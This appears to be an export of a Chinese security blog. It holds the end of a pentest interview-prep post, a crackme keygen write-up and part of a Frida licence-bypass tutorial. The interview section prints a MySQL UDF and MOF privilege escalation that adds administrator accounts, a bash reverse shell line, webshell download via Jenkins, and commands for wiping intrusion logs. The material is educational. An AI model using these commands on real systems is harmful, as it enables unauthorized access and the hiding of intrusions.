<p>使⽤ SQL 语句创建功能函数。语法：Create Function 函数名（函数名只能为下⾯列表中的其中之⼀）returns string </p>
<p>soname ‘导出的 DLL 路径’；</p>
<p>create function cmdshell returns string soname ‘udf.dll’</p>
<p>select cmdshell(‘net user arsch arsch /add’);</p>
<p>select cmdshell(‘net localgroup administrators arsch /add’);</p>
<p>drop function cmdshell;</p>
<p>该⽬录默认是不存在的，这就需要我们使⽤ webshell 找到 MYSQL 的安装⽬录，并在安装⽬录下创建 lib\plugin ⽂件 </p>
<p>夹，然后将 udf.dll ⽂件导出到该⽬录即可。 </p>
<p>MySQL mof 提权</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#pragma namespace(&quot;\\\\.\\root\\subscription&quot;)</span><br><span class="line"></span><br><span class="line">instance of __EventFilter as $EventFilter</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">EventNamespace &#x3D; &quot;Root\\Cimv2&quot;;</span><br><span class="line"></span><br><span class="line">Name &#x3D; &quot;filtP2&quot;;</span><br><span class="line"></span><br><span class="line">Query &#x3D; &quot;Select * From __InstanceModificationEvent &quot;</span><br><span class="line"></span><br><span class="line">&quot;Where TargetInstance Isa \&quot;Win32_LocalTime\&quot; &quot;</span><br><span class="line"></span><br><span class="line">&quot;And TargetInstance.Second &#x3D; 5&quot;;</span><br><span class="line"></span><br><span class="line">QueryLanguage &#x3D; &quot;WQL&quot;;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">instance of ActiveScriptEventConsumer as $Consumer</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">Name &#x3D; &quot;consPCSV2&quot;;</span><br><span class="line"></span><br><span class="line">ScriptingEngine &#x3D; &quot;JScript&quot;;</span><br><span class="line"></span><br><span class="line">ScriptText &#x3D;</span><br><span class="line"></span><br><span class="line">&quot;var WSH &#x3D; new ActiveXObject(\&quot;WScript.Shell\&quot;)\nWSH.run(\&quot;net.exe user waitalone waitalone.cn &#x2F;add\&quot;)&quot;;</span><br><span class="line"></span><br><span class="line">&#125;;instance of __FilterToConsumerBinding</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">Consumer &#x3D; $Consumer;</span><br><span class="line"></span><br><span class="line">Filter &#x3D; $EventFilter;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>其中的第 18 ⾏的命令，上传前请⾃⼰更改。 </p>
<p>2、执⾏ load_fifile 及 into dumpfifile 把⽂件导出到正确的位置即可。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select load file(&#39;c:&#x2F;wmpub&#x2F;nullevt.mof&#39;) into dumpfile &#39;c:&#x2F;windows&#x2F;system32&#x2F;wbem&#x2F;mof&#x2F;nullevt.mov&#39;</span><br></pre></td></tr></table></figure>

<p>执⾏成功后，即可添加⼀个普通⽤户，然后你可以更改命令，再上传导出执⾏把⽤户提升到管理员权限，然后 3389 连 </p>
<p>接之就 ok 了。 </p>
<h4 id="⼗⼋、特殊漏洞"><a href="#⼗⼋、特殊漏洞" class="headerlink" title="⼗⼋、特殊漏洞"></a>⼗⼋、特殊漏洞</h4><p>1、Struts2-045 </p>
<p>2、Redis 未授权 </p>
<p>产⽣原因 </p>
<p>Redis 默认情况下，会绑定在 0.0.0.0:6379，这样将会将 Redis 服务暴露到公⽹上，如果在没有开启认证的情况下，可 </p>
<p>以导致任意⽤户在可以访问⽬标服务器的情况下未授权访问 Redis 以及读取 Redis 的数据。攻击者在未授权访问 Redis </p>
<p>的情况下可以利⽤ Redis 的相关⽅法，可以成功在 Redis 服务器上写⼊公钥，进⽽可以使⽤对应私钥直接登录⽬标服务 </p>
<p>器</p>
<p>利⽤条件和⽅法 </p>
<p>条件: </p>
<p>a、redis 服务以 root 账户运⾏ </p>
<p>b、redis ⽆密码或弱密码进⾏认证c、redis 监听在 0.0.0.0 公⽹上 </p>
<p>⽅法: </p>
<p>a、通过 Redis 的 INFO 命令, 可以查看服务器相关的参数和敏感信息, 为攻击者的后续渗透做铺垫 </p>
<p>b、上传 SSH 公钥获得 SSH 登录权限 </p>
<p>c、通过 crontab 反弹 shell </p>
<p>d、slave 主从模式利⽤ </p>
<p>修复</p>
<p>密码验证 </p>
<p>降权运⾏ </p>
<p>限制 ip / 修改端⼝ </p>
<p>3、Jenkins 未授权访问 </p>
<p>4、MongoDB 未授权访问 </p>
<p>攻击者通过未授权访问进⼊脚本命令执⾏界⾯执⾏攻击指令</p>
<p>println “ifconfig -a”.execute().text 执⾏⼀些系统命令, 利⽤ wget 下载 webshell </p>
<p>开启 MongoDB 服务时不添加任何参数时, 默认是没有权限验证的, ⽽且可以远程访问数据库，登录的⽤户可以通过默认 </p>
<p>端⼝⽆需密码对数据库进⾏增、删、改、查等任意⾼危操作。 </p>
<p>防护</p>
<p>为 MongoDB 添加认证：1)MongoDB 启动时添加–auth 参数 2) 给 MongoDB 添加⽤户：use admin #使⽤ admin 库 </p>
<p>db.addUser(“root”, “123456”) #添加⽤户名 root 密码 123456 的⽤户 db.auth(“root”,“123456”) #验证下是否添加成 </p>
<p>功，返回 1 说明成功 2、禁⽤ HTTP 和 REST 端⼝ MongoDB ⾃身带有⼀个 HTTP 服务和并⽀持 REST 接⼝。在 2.6 </p>
<p>以后这些接⼝默认是关闭的。mongoDB 默认会使⽤默认端⼝监听 web 服务，⼀般不需要通过 web ⽅式进⾏远程管理，建议禁⽤。修改配置⽂件或在启动的时候选择–nohttpinterface 参数 nohttpinterface=false 3、限制绑定 IP 启动时加⼊</p>
<p>参数 –bind_ip 127.0.0.1 或在 / etc/mongodb.conf ⽂件中添加以下内容：bind_ip = 127.0.0.1 </p>
<p>5、Memcache 未授权访问 </p>
<p>Memcached 是⼀套常⽤的 key-value 缓存系统，由于它本身没有权限控制模块，所以对公⽹开放的 Memcache 服务很 </p>
<p>容易被攻击者扫描发现，攻击者通过命令交互可直接读取 Memcached 中的敏感信息。 </p>
<p>利⽤</p>
<p>a、登录机器执⾏ netstat -an |more 命令查看端⼝监听情况。回显 0.0.0.0:11211 表示在所有⽹卡进⾏监听，存在 </p>
<p>memcached 未授权访问漏洞。 </p>
<p>b、telnet 11211，或 nc -vv 11211，提示连接成功表示漏洞存在 </p>
<p>漏洞加固 </p>
<p>a、设置 memchached 只允许本地访问 b、禁⽌外⽹访问 Memcached 11211 端⼝ c、编译时加上–enable-sasl，启⽤ </p>
<p>SASL 认证</p>
<p>6、FFMPEG 本地⽂件读取 </p>
<p>原理</p>
<p>通过调⽤加密 API 将 payload 加密放⼊⼀个会被执⾏的段字节中。但是具体回答⼯程中我只回答道了 SSRF ⽼洞， </p>
<p>m3u8 头，偏移量，加密。 </p>
<h4 id="⼗九、安全知识"><a href="#⼗九、安全知识" class="headerlink" title="⼗九、安全知识"></a>⼗九、安全知识</h4><p>1、WEB </p>
<p>常⻅ WEB 开发 JAVA 框架</p>
<p>STRUTS,SPRING 常⻅的 java 框架漏洞 其实⾯试官问这个问题的时候我不太清楚他要问什么，我提到 struts 的 045048，java 常⻅反序列化。045 错误处理引⼊了 ognl 表达式 048 封装 action 的过程中有⼀步调⽤ getstackvalue 递归 </p>
<p>获取 ognl 表达式 反序列化 操作对象，通过⼿段引⼊。apache common 的反射机制、readobject 的重写，其实具体的 </p>
<p>我也记不清楚。。。然后这部分就结束了 </p>
<p>同源策略 </p>
<p>同源策略限制不同源对当前 document 的属性内容进⾏读取或设置。不同源的区分：协议、域名、⼦域名、IP、端⼝， </p>
<p>以上有不同时即不同源。 </p>
<p>Jsonp 安全攻防技术，怎么写 Jsonp 的攻击⻚⾯</p>
<p>涉及到 Jsonp 的安全攻防内容 </p>
<p>JSON 劫持、Callback 可定义、JSONP 内容可定义、Content-type 不为 json。 </p>
<p>攻击⻚⾯</p>
<p>JSON 劫持，跨域劫持敏感信息，⻚⾯类似于</p>
<p>function wooyun(v){</p>
<p>alert(v.username);</p>
<p>}</p>
<p> </p>
<script src="http://js.login.360.cn/?o=sso&m=info&func=wooyun"></script> 

<p>Content-type 不正确情况下，JSONP 和 Callback 内容可定义可造成 XSS。JSONP 和 FLASH 及其他的利⽤参照知道 </p>
<p>创宇的 JSONP 安全攻防技术。 </p>
<p>2、PHP </p>
<p>php 中命令执⾏涉及到的函数 </p>
<p>代码执⾏：eval()、assert()、popen()、system()、exec()、shell_exec()、 </p>
<p>passthru(),pcntl_exec(),call_user_func_array(),create_function()⽂件读取：fifile_get_contents(),highlight_fifile(),fopen(),read fifile(),fread(),fgetss(), </p>
<p>fgets(),parse_ini_fifile(),show_source(),fifile() 等 </p>
<p>命令执⾏：system(), exec(), shell_exec(), passthru() ,pcntl_exec(), popen(),proc_open() </p>
<p>安全模式下绕过 php 的 disable fuction </p>
<p>DL 函数，组件漏洞，环境变量。 </p>
<p>PHP 弱类型</p>
<p>== 在进⾏⽐较的时候，会先将字符串类型转化成相同，再⽐较 </p>
<p>如果⽐较⼀个数字和字符串或者⽐较涉及到数字内容的字符串，则字符串会被转换成数值并且⽐较按照数值来进⾏</p>
<p>0e 开头的字符串等于 0 </p>
<p>3、数据库 </p>
<p>各种数据库⽂件存放的位置 </p>
<p>mysql:</p>
<p>/usr/local/mysql/data/</p>
<p>C:\ProgramData\MySQL\MySQL Server 5.6\Data\</p>
<p>oracle: $ORACLE_BASE/oradata/$ORACLE_SID/</p>
<p>4、系统</p>
<p>如何清理⽇志如何清理⽇志 </p>
<p>meterpreter: clearev</p>
<p>⼊侵 Linux 服务器后需要清除哪些⽇志？ </p>
<p>web ⽇志，如 apache 的 access.log,error.log。直接将⽇志清除过于明显, ⼀般使⽤ sed 进⾏定向清除 </p>
<p>e.g. sed -i -e ‘/192.169.1.1/d’ </p>
<p>history 命令的清除，也是对~/.bash_history 进⾏定向清除 </p>
<p>wtmp ⽇志的清除，/var/log/wtmp </p>
<p>登录⽇志清除 /var/log/secure </p>
<p>LINUX </p>
<p>查看当前端⼝连接的命令有哪些？netstat 和 ss 命令的区别和优缺点</p>
<p>netstat -antp<code></code>ss -l</p>
<p>ss 的优势在于它能够显示更多更详细的有关 TCP 和连接状态的信息，⽽且⽐ netstat 更快速更⾼效。 </p>
<p>反弹 shell 的常⽤命令？⼀般常反弹哪⼀种 shell？为什么?</p>
<p>bash -i&gt;&amp;/dev/tcp/x.x.x.x/4444 0&gt;&amp;1</p>
<p>通过 Linux 系统的 / proc ⽬录 ，能够获取到哪些信息，这些信息可以在安全上有哪些应⽤？</p>
<p>ls /proc</p>
<p>系统信息，硬件信息，内核版本，加载的模块，进程 </p>
<p>linux 系统中，检测哪些配置⽂件的配置项，能够提升 SSH 的安全性。</p>
<p>/etc/ssh/sshd config iptables 配置/etc/ssh/sshd___config iptables 配置 </p>
<p>如何⼀条命令查看⽂件内容最后⼀百⾏</p>
<p>tail -n 100 filename</p>
<p>Windows </p>
<p>如何加固⼀个域环境下的 Windows 桌⾯⼯作环境？请给出你的思路。 </p>
<p>5、密码学 </p>
<p>AES／DES 的具体⼯作步骤 </p>
<p>RSA 算法 </p>
<p>加密: </p>
<p>密⽂＝明⽂ ^EmodN </p>
<p>RSA 加密是对明⽂的 E 次⽅后除以 N 后求余数的过程 </p>
<p>公钥＝(E,N) </p>
<p>解密: </p>
<p>明⽂＝密⽂ ^DmodN 私钥＝(D,N)</p>
<p>三个参数 n,e1,e2 </p>
<p>n 是两个⼤质数 p,q 的积 </p>
<p>分组密码的加密模式 </p>
<p>如何⽣成⼀个安全的随机数？ </p>
<p>引⽤之前⼀个学⻓的答案，可以通过⼀些物理系统⽣成随机数，如电压的波动、磁盘磁头读 / 写时的寻道时间、空中电磁波的噪声等。 </p>
<p>SSL 握⼿过程 </p>
<p>建⽴ TCP 连接、客户端发送 SSL 请求、服务端处理 SSL 请求、客户端发送公共密钥加密过的随机数据、服务端⽤私有 </p>
<p>密钥解密加密后的随机数据并协商暗号、服务端跟客户端利⽤暗号⽣成加密算法跟密钥 key、之后正常通信。这部分本</p>
<p>来是忘了的，但是之前看 SSL Pinning 的时候好像记了张图在脑⼦⾥，挣扎半天还是没敢确定，遂放弃。。。</p>
<p>对称加密与⾮对称加密的不同，分别⽤在哪些⽅⾯ </p>
<p>6、TCP/IP</p>
<p>TCP 三次握⼿的过程以及对应的状态转换 </p>
<p>（1）客户端向服务器端发送⼀个 SYN 包，包含客户端使⽤的端⼝号和初始序列号 x; </p>
<p>（2）服务器端收到客户端发送来的 SYN 包后，向客户端发送⼀个 SYN 和 ACK 都置位的 TCP 报⽂，包含确认号 xx1 </p>
<p>和服务器端的初始序列号 y; </p>
<p>（3）客户端收到服务器端返回的 SYNSACK 报⽂后，向服务器端返回⼀个确认号为 yy1、序号为 xx1 的 ACK 报⽂，⼀</p>
<p>个标准的 TCP 连接完成。 </p>
<p>TCP 和 UDP 协议区别 </p>
<p>tcp ⾯向连接, udp ⾯向报⽂ tcp 对系统资源的要求多 udp 结构简单 tcp 保证数据完整性和顺序，udp 不保证 </p>
<p>https 的建⽴过程 </p>
<p>a、客户端发送请求到服务器端 </p>
<p>b、服务器端返回证书和公开密钥，公开密钥作为证书的⼀部分⽽存在 </p>
<p>c、客户端验证证书和公开密钥的有效性，如果有效，则⽣成共享密钥并使⽤公开密钥加密发送到服务器端 </p>
<p>d、服务器端使⽤私有密钥解密数据，并使⽤收到的共享密钥加密数据，发送到客户端 </p>
<p>e、客户端使⽤共享密钥解密数据</p>
<p>f SSL 加密建⽴f、SSL 加密建⽴ </p>
<p>7、流量分析 </p>
<p>wireshark 简单的过滤规则 </p>
<p>过滤 ip: </p>
<p>过滤源 ip 地址: ip.src==1.1.1.1; , ⽬的 ip 地址: ip.dst==1.1.1.1;</p>
<p>过滤端⼝: </p>
<p>过滤 80 端⼝: tcp.port==80 , 源端⼝: tcp.srcport==80 , ⽬的端⼝: tcp.dstport==80</p>
<p>协议过滤: </p>
<p>直接输⼊协议名即可, 如 http 协议 http</p>
<p>http 模式过滤: </p>
<p>过滤 get/post 包 http.request.mothod==”GET/POST”</p>
<p>8、防⽕墙 </p>
<p>简述路由器交换机、防⽕墙等⽹络设备常⽤的⼏个基础配置加固项，以及配置⽅法。</p>
<p>转自：</p>
<p><a href="https://github.com/Mr-xn/BurpSuite-collections">https://github.com/Mr-xn/BurpSuite-collections</a></p>
]]></content>
      <categories>
        <category>WEB安全</category>
      </categories>
      <tags>
        <tag>面试</tag>
      </tags>
  </entry>
  <entry>
    <title>crackme-系列之-crackme4</title>
    <url>/2021/01/04/%E4%BA%8C%E8%BF%9B%E5%88%B6%E5%AE%89%E5%85%A8/crackme%E7%B3%BB%E5%88%97/crackme-%E7%B3%BB%E5%88%97%E4%B9%8B-crackme4/</url>
    <content><![CDATA[<h2 id="首先进行查壳"><a href="#首先进行查壳" class="headerlink" title="首先进行查壳"></a>首先进行查壳</h2><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210104230306003.png" alt="image-20210104230306003" style="zoom:50%;">

<p>可以看到程序使用的Delphi编写的 没有加壳</p>
<a id="more"></a>

<h2 id="导出符号"><a href="#导出符号" class="headerlink" title="导出符号"></a>导出符号</h2><p>既然是delphi编写的 那么我们首先把他放到IDA里，把所有的关于Delphi的签名全部加上</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210104230428344.png" alt="image-20210104230428344"></p>
<p>ida会自动帮我们识别所有的Delphi的函数，可以看到添加签名之后 未识别的函数就只有那么一点点，剩下的都是库函数。</p>
<p>然后导出为MAP文件，导入到OD里(LoadMapEx)，可以极大的减轻负担。</p>
<h2 id="窗体分析"><a href="#窗体分析" class="headerlink" title="窗体分析"></a>窗体分析</h2><p>两个编辑框 一个图片显示框，据说是注册之后会显示一个朱茵的图片。没有按钮，没有提示</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210104230656046.png" alt="image-20210104230656046" style="zoom:50%;">

<p>利用Delphi的反编译工具Darkde4进行查看</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210104230805587.png" alt="image-20210104230805587"></p>
<p>打开窗体部分，原来之前一直误以为的图片显示框是一个大按钮，这个按钮有两个对应事件， 分别是单击事件和双击事件</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210104230922854.png" alt="image-20210104230922854"></p>
<p>这里是整个程序的所有的响应事件 以及对应的RVA </p>
<blockquote>
<ul>
<li>第一个FormCreate是窗体的创建事件 这个不必关心，一般创建事件都是显示图形界面相关的操作 </li>
<li>第二个事件名是chkcode，全称应该是checkcode，校验代码，至于校验的是什么代码？不知道 </li>
<li>第三个KeyUp是响应的键盘的弹起 </li>
<li>第四个DbClick是按钮的双击事件 </li>
<li>第五个Click是按钮的单击事件 </li>
</ul>
</blockquote>
<p>那么思路和突破口也就有了，对应单击和双击事件的RVA 直接去OD分析两个响应事件的具体实现部分。</p>
<h2 id="OD分析"><a href="#OD分析" class="headerlink" title="OD分析"></a>OD分析</h2><p>在单击事件的RVA 0x00457B8处下断点，随便输入一组用户名，从上往下分析所有的执行过程。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210104231029614.png" alt="image-20210104231029614"></p>
<ol>
<li><p>获取用户名</p>
</li>
<li><p>获取用户名长度 将长度加上0x1E </p>
</li>
<li><p>将长度转为字符串 </p>
</li>
<li><p>字符串拼接 拼接为长度+用户名+循环次数 </p>
</li>
<li><p>整个算法循环18次 最后的结果如上图</p>
</li>
</ol>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210104231109372.png" alt="image-20210104231109372"></p>
<p>算法循环完了之后 比较[esi+0x30C]的值是否相等，如果不相等直接退出。如果相等，又是一轮重复的循环校验，接着提示注册成功。就是说前面的循环算法就是作者下的一个套，真正有用的部分就是这个比较，也就是[esi+0x30C] 的值必须是0x85。</p>
<p><strong>结论</strong></p>
<blockquote>
<p>[esi+0x30C] 的值必须是0x85。</p>
</blockquote>
<p><strong>双击事件</strong></p>
<p>通过Delphi的反编译工具Darkde4的过程窗口找到双击事件的RVA。下断点，分析。注意，在这之前必须取消单击事件的断点，否则无法断下来。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210104231321825.png" alt="image-20210104231321825"></p>
<p>还是同样的套路，一轮循环的验证之后，才来到真正有用的部分。 [esi+0x30C]和0x3E作比较，如果成立，就把[esi+0x30C]赋值为0x85，也就满足了单击事件的条件。 也就是说必定有一个地方，是把[esi+0x30C]赋值为0x3E。如果满足了这个条件，那么双击事件校验通过，单击事件 也通过。</p>
<p><strong>结论</strong></p>
<blockquote>
<p>[esi+0x30C]的值必须为0x3E</p>
</blockquote>
<p><strong>再次寻找突破口</strong></p>
<p>根据双击事件经验 我们能猜测，肯定有一个地方是把0x3E赋值给了[esi+0x30C]。 那么我们直接在OD中，右键-&gt;查找所有常量，输入3E，看看能不能找到mov [esi+0x30C],0x3E这样一条指令。如果能，那么这个就是真正校验的地方。</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210104231438376.png" alt="image-20210104231438376"></p>
<p>拉到函数最上面</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210104231501583.png" alt="image-20210104231501583"></p>
<p>之前导入的IDA的注释显示这个是chkcode的校验事件。就是之前我们在Darkde4过程窗口里看到的checkcode的响应事件，这个应该就是真正的校验函数了。下断点，开始分析</p>
<p><strong>chcode事件</strong></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210104231540286.png" alt="image-20210104231540286"></p>
<p>首先获取用户名长度 然后将用户名长度+5，接着进行字符串拼接 拼接方式为黑头Sun Bird(用户名长度+5)dseloffc012-OK(用户名)，拼接好的字符串就是密码。</p>
<p><strong>结果</strong></p>
<p>接着输入用户名和序列号，根据之前的分析过程 我们需要先双击，再单击才能够校验成功</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210104231617223.png" alt="image-20210104231617223"></p>
<p>但是这里需要注意一点，在过程窗口中有一个KeyUp键盘弹起事件，在你输入序列号的时候 他会检测是否有键盘弹起，如果没有则不成功，这样做的目的是为了防止复制粘贴。破解的方法也很简单，在复制粘贴完序列号之后随便 按一个键(比如方向键 这样不会影响到输入结果)，接着双击再单击。可以看到，成功注册完成。</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210104231703531.png" alt="image-20210104231703531" style="zoom:50%;">

<h2 id="注册机编写"><a href="#注册机编写" class="headerlink" title="注册机编写"></a>注册机编写</h2><blockquote>
<p>C</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &quot;pch.h&quot; </span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br><span class="line">int main() </span><br><span class="line">&#123; </span><br><span class="line">    char key1[50] &#x3D; &quot;黑头Sun Bird&quot;; </span><br><span class="line">    char key2[50] &#x3D; &quot;dseloffc-012-OK&quot;; </span><br><span class="line">    char username[20] &#x3D; &#123; 0 &#125;; </span><br><span class="line">    printf(&quot;请输入用户名:&quot;); </span><br><span class="line">    scanf_s(&quot;%s&quot;, username, 20); </span><br><span class="line">    printf(&quot;序列号为:\n&quot;); </span><br><span class="line">    printf(&quot;%s%d%s%s\n&quot;, key1, strlen(username)+5, key2, username); </span><br><span class="line">    system(&quot;pause&quot;); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>Python</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">print(&quot;please input username&quot;)</span><br><span class="line">s &#x3D; raw_input()</span><br><span class="line">print(&quot;黑头Sun Bird&quot; + str(len(s)+5) + &quot;dseloffc-012-OK&quot; + s)</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20210104231832620.png" alt="image-20210104231832620"></p>
]]></content>
      <categories>
        <category>二进制安全</category>
      </categories>
      <tags>
        <tag>crackme</tag>
      </tags>
  </entry>
  <entry>
    <title>Hook框架Frida练习（1）</title>
    <url>/2020/12/04/Android/frida/Hook%E6%A1%86%E6%9E%B6Frida%E7%BB%83%E4%B9%A0%EF%BC%881%EF%BC%89/</url>
    <content><![CDATA[<h2 id="文章涉及到的知识点："><a href="#文章涉及到的知识点：" class="headerlink" title="文章涉及到的知识点："></a>文章涉及到的知识点：</h2><ul>
<li>怎么使用javascript实例化类并调用类方法</li>
<li>怎么在”jscode”中增加自定义javascript方法</li>
<li>怎么较为灵活的hook类方法</li>
</ul>
<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Mac Os 10.15.5</span><br><span class="line">Python 3.7</span><br><span class="line">Google Nexus 6P Anroid 6.0.1</span><br><span class="line">Frida官网：https:&#x2F;&#x2F;www.frida.re&#x2F;</span><br><span class="line">Frida源码：https:&#x2F;&#x2F;github.com&#x2F;frida</span><br></pre></td></tr></table></figure>

<p>apk的下载地址：<a href="https://github.com/ghostmaze/Android-Reverse/raw/master/WhyShouldIPay/WhyShouldIPay.apk">whyshouldIpay</a></p>
<a id="more"></a>

<h2 id="安装APK"><a href="#安装APK" class="headerlink" title="安装APK"></a>安装APK</h2><p>下载apk安装，先看看是什么功能，简单的使用后，了解到<code>PREMIUM CONETNT</code>内容需要输入License验证后才能查看。<code>PREMIUM CONETNT</code>按钮中的内容应该是答案。</p>
<img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217204346213.png" alt="image-20201217204346213" style="zoom: 33%;">

<h2 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h2><p>使用jadx将apk反编译出来，分析，在AndroidManifest.xml中找到了启动的Activity是<code>LauncherActivity</code></p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201217204804697.png" alt="image-20201217204804697"></p>
<p>找到其中的主要代码进行分析</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public void verifyClick(View v) &#123;</span><br><span class="line">						&#x2F;&#x2F;第一个验证，将输入的Licese通过网络验证，但这个肯定是通不过的，这是一个可								能需要绕过的点。</span><br><span class="line">       try &#123;</span><br><span class="line">           InputStream in &#x3D; new URL(&quot;http:&#x2F;&#x2F;broken.license.server.com&#x2F;query?license&#x3D;&quot; + ((EditText) findViewById(R.id.text_license)).getText().toString()).openConnection().getInputStream();</span><br><span class="line">           StringBuilder responseBuilder &#x3D; new StringBuilder();</span><br><span class="line">           byte[] b &#x3D; new byte[0];</span><br><span class="line">           while (in.read(b) &gt; 0) &#123;</span><br><span class="line">               responseBuilder.append(b);</span><br><span class="line">           &#125;</span><br><span class="line">           String response &#x3D; responseBuilder.toString();</span><br><span class="line">           &#x2F;&#x2F;网络验证需要服务器返回 &quot;LICENSEKEYOK&quot;，才能进行下一步</span><br><span class="line">           if (response.equals(&quot;LICENSEKEYOK&quot;)) &#123;</span><br><span class="line">           &#x2F;&#x2F;当网络验证成功后，生成激活秘钥，并写入到preferences文件中</span><br><span class="line">               String activatedKey &#x3D; new String(MainActivity.xor(getMac().getBytes(), response.getBytes()));</span><br><span class="line">               SharedPreferences.Editor editor &#x3D; getApplicationContext().getSharedPreferences(&quot;preferences&quot;, 0).edit();</span><br><span class="line">               editor.putString(&quot;KEY&quot;, activatedKey);</span><br><span class="line">               &#x2F;&#x2F;这样便成功激活</span><br><span class="line">               editor.commit();</span><br><span class="line">               new AlertDialog.Builder(this).setTitle(&quot;Activation successful&quot;).setMessage(&quot;Activation successful&quot;).setIcon(17301543).show();</span><br><span class="line">               return;</span><br><span class="line">           &#125;</span><br><span class="line">           new AlertDialog.Builder(this).setTitle(&quot;Invalid license!&quot;).setMessage(&quot;Invalid license!&quot;).setIcon(17301543).show();</span><br><span class="line">       &#125; catch (Exception e) &#123;</span><br><span class="line">           new AlertDialog.Builder(this).setTitle(&quot;Error occured&quot;).setMessage(&quot;Server unreachable&quot;).setNeutralButton(&quot;OK&quot;, (DialogInterface.OnClickListener) null).setIcon(17301543).show();</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>在<code>verifyClick</code>中可以知道生成激活秘钥的算法是<code>MainActivity.xor</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">String activatedKey &#x3D; new String(MainActivity.xor(getMac().getBytes(), response.getBytes()));</span><br></pre></td></tr></table></figure>

<p>到<code>MainActivity</code>中，查看该方法，看上去算起来还是比较麻烦。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public static byte[] xor(byte[] val, byte[] key) &#123;</span><br><span class="line">    byte[] o &#x3D; new byte[val.length];</span><br><span class="line">    for (int i &#x3D; 0; i &lt; val.length; i++) &#123;</span><br><span class="line">        o[i] &#x3D; (byte) (val[i] ^ key[i % key.length]);</span><br><span class="line">    &#125;</span><br><span class="line">    return o;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>接下来当程序被激活成功后，点击<code>PREMIUM CONETNT</code>按钮，会调用<code>MainActivity</code>中的方法，可以看到它将MAC，以及生成的Key发送到了<code>MainActivity</code>中。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">public void showPremium(View view) &#123;</span><br><span class="line">       Intent i &#x3D; new Intent(this, MainActivity.class);</span><br><span class="line">       i.putExtra(&quot;MAC&quot;, getMac());</span><br><span class="line">       i.putExtra(&quot;KEY&quot;, getKey());</span><br><span class="line">       startActivity(i);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>在<code>MainActivity</code>的<code>onCreate</code>方法中，看到了最终答案生成的native方法<code>stringFromJNI(key, mac)</code>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">protected void onCreate(Bundle savedInstanceState) &#123;</span><br><span class="line"> &#x2F;&#x2F;获取Intent传递过来的值</span><br><span class="line">        String key &#x3D; getIntent().getStringExtra(&quot;KEY&quot;);</span><br><span class="line">        String mac &#x3D; getIntent().getStringExtra(&quot;MAC&quot;);</span><br><span class="line">        if (key &#x3D;&#x3D; &quot;&quot; || mac &#x3D;&#x3D; &quot;&quot;) &#123;</span><br><span class="line">            key &#x3D; &quot;&quot;;</span><br><span class="line">            mac &#x3D; &quot;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">        super.onCreate(savedInstanceState);</span><br><span class="line">        setContentView((int) R.layout.activity_main);</span><br><span class="line">     &#x2F;&#x2F;调用native函数，算出答案</span><br><span class="line">        ((TextView) findViewById(R.id.sample_text)).setText(stringFromJNI(key, mac));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>大概过程如下：</p>
<ol>
<li>输入License，进行验证</li>
<li>通过网络验证获取返回值“LICENSEKEYOK”后，然后调用<code>MainActivity.xor</code>在本地<code>preferences</code>文件中生成秘钥，激活成功。</li>
<li>本地获取MAC地址及秘钥Key传入<code>MainActivity</code>得出答案。</li>
</ol>
<h3 id="对hook点进行分析"><a href="#对hook点进行分析" class="headerlink" title="对hook点进行分析"></a>对hook点进行分析</h3><ol>
<li><p>获取getMac()函数的返回值，与“LICENSEKEYOK”字符串进行xor运算得出秘钥Key.</p>
</li>
<li><p>hook getKey方法，让它不从<code>preferences</code>文件读取Key,而是我们自己构造。</p>
</li>
<li><p>hook <code>verifyClick</code>,让它调用<code>showPremium</code>方法</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20201229114906268.png" alt="image-20201229114906268"></p>
</li>
</ol>
